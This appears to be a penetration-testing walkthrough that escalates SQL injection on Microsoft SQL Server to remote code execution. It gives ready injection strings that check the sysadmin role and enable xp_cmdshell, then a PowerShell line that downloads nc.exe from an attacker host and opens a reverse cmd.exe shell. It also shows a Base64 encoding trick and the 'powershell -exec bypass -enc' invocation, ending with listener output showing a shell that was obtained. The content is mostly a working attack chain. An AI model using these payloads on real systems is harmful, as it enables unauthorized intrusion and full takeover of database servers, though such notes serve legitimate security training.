# Remote Code Execution

### **Verifying Permissions**

- Verify if we can use `xp_cmdshell`
- We can check if we are running as `sa` with the following query

```sql
IS_SRVROLEMEMBER('sysadmin');
# 1 -> Yes
# 0 -> No

# Example
maria' AND IS_SRVROLEMEMBER('sysadmin')=1;--
```

![Returns taken which is true in our case → we have the `sysadmin` role](Remote%20Code%20Execution/image.png)

Returns taken which is true in our case → we have the `sysadmin` role

### **Enabling [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16)**

- By default it executes commands as `nt service\mssqlserver` unless a proxy account is set up
- Disabled by default ins MSSQL, but we can enable it by first enabling `advanced options`

```sql
EXEC sp_configure 'Show Advanced Options', '1';
RECONFIGURE;

# Example
';exec sp_configure 'show advanced options','1';reconfigure;--
```

- We will get a regular response from the server if it worked

![image.png](Remote%20Code%20Execution/image%201.png)

- Now enable `xp_cmdshell`

```sql
EXEC sp_configure 'xp_cmdshell', '1';
RECONFIGURE;

# Example
';exec sp_configure 'xp_cmdshell','1';reconfigure;--
```

![image.png](Remote%20Code%20Execution/image%202.png)

- Now we can execute commands

```sql
EXEC xp_cmdshell 'ping /n 4 192.168.43.164';

# Example
';exec xp_cmdshell 'ping /n 4 192.168.43.164';--
```

### **Reverse Shell**

- Many other ways to do this; in this case we use `netcat` to run `cmd.exe`
- First download `nc.exe` from our attacker and then connect to a given port on our attacker machine and run `cmd.exe`

```sql
(new-object net.webclient).downloadfile("http://192.168.43.164/nc.exe", "c:\windows\tasks\nc.exe");
c:\windows\tasks\nc.exe -nv 192.168.43.164 9999 -e c:\windows\system32\cmd.exe;
```

> To avoid the hassle of quotation marks, `encoding` PowerShell payloads is prefered. One useful tool to do so is from [Raikia's Hub](https://raikia.com/tool-powershell-encoder/), however, it is known that from time to time it goes offline. As penetration testers, it is important to know how to perform such tasks without relying on any external tools. To encode the payload, we need to first convert it to `UTF-16LE` (`16-bit Unicode Transformation Format Little-Endian`) then Base64-encode it. We can use the following Python3 one-liner to encode the payload, replacing `PAYLOAD` with the actual `PowerShell` one:
> 

```sql
**python3 -c 'import base64; print(base64.b64encode((r"""PAYLOAD""").encode("utf-16-le")).decode())'**
```

```sql
python3 -c 'import base64; print(base64.b64encode((r"""(new-object net.webclient).downloadfile("http://192.168.43.164/nc.exe", "c:\windows\tasks\nc.exe"); c:\windows\tasks\nc.exe -nv 192.168.43.164 9999 -e c:\windows\system32\cmd.exe;""").encode("utf-16-le")).decode())'

KABuAGUAdwAtAG8...
```

- Pass it to `powershell` setting the `Execution Policy` to `bypass` along with the `-enc` (`encoded`) flag

```sql
exec xp_cmdshell 'powershell -exec bypass -enc KAB..=='
```

### Setup Attacker Machine

- Download https://github.com/int0x33/nc.exe

```sql
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```sql
nc -nvlp 9999
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 192.168.43.156.
Ncat: Connection from 192.168.43.156:58085.
Microsoft Windows [Version 10.0.19043.1826]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

> Note: If you prefer using powershell, you can of course have `nc.exe` run it instead of `cmd.exe` by using a command like `cmd nc.exe -nv 192.168.43.164 9999 -e C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe`
>